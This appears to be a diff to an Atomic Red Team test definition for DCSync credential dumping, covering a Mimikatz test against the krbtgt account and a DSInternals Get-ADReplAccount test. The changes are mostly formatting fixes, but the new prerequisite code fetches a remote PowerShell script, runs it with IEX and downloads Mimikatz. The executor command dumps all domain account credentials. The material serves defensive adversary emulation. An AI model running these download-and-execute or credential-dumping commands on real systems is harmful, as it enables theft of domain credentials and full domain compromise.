@@ -9,19 +9,19 @@ atomic_tests:
     Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
     [Reference](https://adsecurity.org/?p=1729)
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     domain:
       description: Targeted Active Directory domain
-      type: String
+      type: string
       default: '%userdnsdomain%'
     user:
       description: Targeted user
-      type: String
+      type: string
       default: krbtgt
     mimikatz_path:
       description: Mimikatz windows executable
-      type: Path
+      type: path
       default: '%tmp%\mimikatz\x64\mimikatz.exe'
   dependency_executor_name: powershell
   dependencies:
@@ -31,12 +31,13 @@ atomic_tests:
       $mimikatz_path = cmd /c echo #{mimikatz_path}
       if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
     get_prereq_command: |
-      $mimikatz_path = cmd /c echo #{mimikatz_path}
-      $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
-      Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
-      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
-      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
-      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
+      $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
+      $zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
+      $mimikatz_exe = cmd /c echo #{mimikatz_path}
+      $basePath = Split-Path $mimikatz_exe | Split-Path
+      Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
   executor:
     name: command_prompt
     elevation_required: false
@@ -48,14 +49,14 @@ atomic_tests:
   description: |
     The following Atomic will run Get-ADReplAccount from DSInternals.
     Upon successful execution, domain and credentials will appear in stdout. 
-    [Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellerParticle.
+    [Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
     https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
   supported_platforms:
   - windows
   input_arguments:
     logonserver:
       description: ComputerName argument default %logonserver%
-      type: String
+      type: string
       default: $ENV:logonserver.TrimStart("\")
   dependency_executor_name: powershell
   dependencies:
@@ -63,12 +64,11 @@ atomic_tests:
       DSInternals must be installed
     prereq_command: |
       $RequiredModule = Get-Module -Name DSInternals -ListAvailable
-      if (-not $RequiredModule) {exit 1}
-      if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
+      if (-not $RequiredModule) {exit 1} else {exit 0}
     get_prereq_command: |
       Install-Module -Name DSInternals -Scope CurrentUser -Force
   executor:
     command: |
       Get-ADReplAccount -All -Server #{logonserver}
     name: powershell
-    elevation_required: False
+    elevation_required: false
